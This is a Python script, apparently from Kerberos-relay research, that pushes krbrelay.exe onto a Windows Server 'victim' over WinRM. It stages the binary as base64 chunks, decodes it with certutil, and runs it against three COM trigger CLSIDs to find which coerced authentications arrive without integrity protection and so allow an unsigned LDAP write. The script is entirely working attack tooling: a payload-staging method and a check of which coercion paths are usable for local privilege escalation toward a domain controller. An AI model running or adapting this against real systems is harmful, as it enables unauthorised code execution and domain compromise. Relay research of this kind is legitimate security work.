#!/usr/bin/env python3
"""Measure the coerced RPC auth level per COM trigger on a Server 2022 victim.

Uploads the diagnostic exe to the victim over WinRM, runs it once per trigger
CLSID with no relay listening, and reads the "[probe] coerced auth_type/auth_level"
line the exe prints at capture time. level 2 = CONNECT (no integrity, the path
that works); level 5/6 = packet integrity/privacy (blocks the unsigned write).

Creds/host from env: WUSER, WPASS, WH (default 10.112.0.84). Run with system
python3 (pywinrm lives there).
"""
import base64
import os
import sys

import winrm

host = os.environ.get("WH", "10.112.0.84")
user = os.environ["WUSER"]
pw = os.environ["WPASS"]
exe_path = os.path.join(os.path.dirname(__file__), "krbrelay.exe")

s = winrm.Session(f"http://{host}:5985/wsman", auth=(user, pw), transport="ntlm")

b64 = base64.b64encode(open(exe_path, "rb").read()).decode()
rb64 = r"C:\Windows\Temp\kr.b64"
rexe = r"C:\Windows\Temp\kr.exe"

print(f"[*] uploading {len(b64)} b64 chars to {host}")
s.run_cmd(f"del /q {rb64} {rexe} 2>nul & echo c")
CH = 6000
for i in range(0, len(b64), CH):
    r = s.run_cmd(f"echo {b64[i:i+CH]}>>{rb64}")
    if r.status_code != 0:
        print("chunk fail", r.std_err.decode(errors="replace")[:200])
        sys.exit(1)
r = s.run_cmd(f"certutil -decode {rb64} {rexe}")
print("[*] decode rc", r.status_code, r.std_out.decode(errors="replace").strip().splitlines()[-1:])

CLSIDS = {
    "McpManagementService": "{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}",
    "PrintNotify": "{854A20FB-2D44-457D-992F-EF13785D2B51}",
    "AxInstSv": "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}",
}
for name, clsid in CLSIDS.items():
    cmd = f'set KRBRELAY_PROBE=1&& {rexe} 127.0.0.1 9999 ldap/dc.mayyhem.com 127.0.0.1 7989 "{clsid}"'
    r = s.run_cmd(cmd)
    out = (r.std_out + b"\n" + r.std_err).decode(errors="replace")
    lines = [l.strip() for l in out.splitlines() if "[probe]" in l or "auth_level" in l or "stage" in l]
    print(f"--- {name} {clsid} ---")
    for l in (lines or ["(no probe line; raw tail: " + out.strip().splitlines()[-1] + ")"] if out.strip() else ["(no output)"]):
        print("   ", l)

s.run_cmd(f"del /q {rb64} {rexe} 2>nul & echo done")
print("[*] cleaned up")
